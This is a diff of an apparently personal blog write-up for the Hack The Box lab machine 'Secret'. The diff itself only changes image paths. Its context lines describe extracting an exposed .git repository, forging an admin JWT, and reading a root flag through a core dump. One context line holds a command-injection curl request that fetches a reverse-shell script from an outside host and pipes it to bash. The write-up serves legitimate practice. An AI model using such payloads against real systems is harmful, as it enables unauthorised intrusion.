@@ -7,7 +7,7 @@ tags: [.git,JWT token,source code review,core dump]
 
 # Secret
 
-![Secret info card](/assets/lib/img/secret/secret.png)
+![Secret info card](/assets/img/secret/secret.png)
 
 Secret is an easy machine on Hackthebox. Started with .git expose and use gittools to extract the repository. Review the source code from the repository and found lot of endpoints. The JSON Web Token will be generate and it help us to manipulate and perform remote code execution then use to get reverse shell. To escalate to root then we need to code review of c program. From that we find that we need to crash the program then it allows us to see the content of the memory via core dump. Then can get the root flag.
 
@@ -37,21 +37,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Check the http web and found some download button and it shows that the download button have source code.
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled.png)
+![Untitled](/assets/img/secret/Untitled.png)
 
 In the unzip file we can see the .git dir so we can extract it with gitTools. https://github.com/internetwache/GitTools
 
 The extractor section will extract commits and their content from a broken repository.
 
-![Extract the source code from the commits](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%201.png)
+![Extract the source code from the commits](/assets/img/secret/Untitled%201.png)
 
 Extract the source code from the commits
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%202.png)
+![Untitled](/assets/img/secret/Untitled%202.png)
 
 Extract all the commit source code need to do enumeration. We got lot of endpoint and do not know how to exploit. In `forgot.js` file we see the a condition to check the name of the user.
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%203.png)
+![Untitled](/assets/img/secret/Untitled%203.png)
 
 `private.js` file have have the check role condition where if the user is theadmin we can get the flag??
 
@@ -215,7 +215,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWM
 
 From the [jwt.io](http://jwt.io) we can see that theadmin name have one space and we can get the jwt  token.
 
-![Payload of the curl command](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%204.png)
+![Payload of the curl command](/assets/img/secret/Untitled%204.png)
 
 Payload of the curl command
 
@@ -321,7 +321,7 @@ root@Rav3nCLaW [11:49:57 PM] [~/Documents/htb/secret]
 -> # curl http://10.10.11.120/api/logs\?file\=\|curl%20http://10.10.14.84:8000/revshell.sh%20%7C%20bash -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMwYTRiZTRhZmVhODA0M2VlMDEzNjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDAxNTA1OH0.FL2H-2FwHFWTa1gz9PRrYWRrgKk1QlOIJM1kwWj29Q0'
 ```
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%205.png)
+![Untitled](/assets/img/secret/Untitled%205.png)
 
 ## **Privilage escalation**
 
@@ -474,7 +474,7 @@ int main()
 
 Meaning of the function [https://www.tutorialspoint.com/unix_system_calls/prctl.htm](https://www.tutorialspoint.com/unix_system_calls/prctl.htm)
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%206.png)
+![Untitled](/assets/img/secret/Untitled%206.png)
 
 The idea is to make the program crash and the program will return the core dump in `/var/crash` The idea to crash it because the file of the cannot be write and since the function of pcrtl got in the code maybe it is the way.
 
@@ -482,7 +482,7 @@ The idea is to make the program crash and the program will return the core dump 
 
 [https://wiki.ubuntu.com/CrashReporting](https://wiki.ubuntu.com/CrashReporting)
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%207.png)
+![Untitled](/assets/img/secret/Untitled%207.png)
 
 Run the count program and check the PID of the program to make it crash
 
@@ -490,12 +490,12 @@ Run the count program and check the PID of the program to make it crash
 kill -SEGV 45739
 ```
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%208.png)
+![Untitled](/assets/img/secret/Untitled%208.png)
 
 After kill the process we know that crash dump at the kernel will be at the `/var/crash` . Then use the apport-unpack to extract the core dump.
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%209.png)
+![Untitled](/assets/img/secret/Untitled%209.png)
 
-![Untitled](Secret%206a81d25ae88740f5bfff567d38825557/Untitled%2010.png)
+![Untitled](/assets/img/secret/Untitled%2010.png)
 
 Get the flag and submit it.
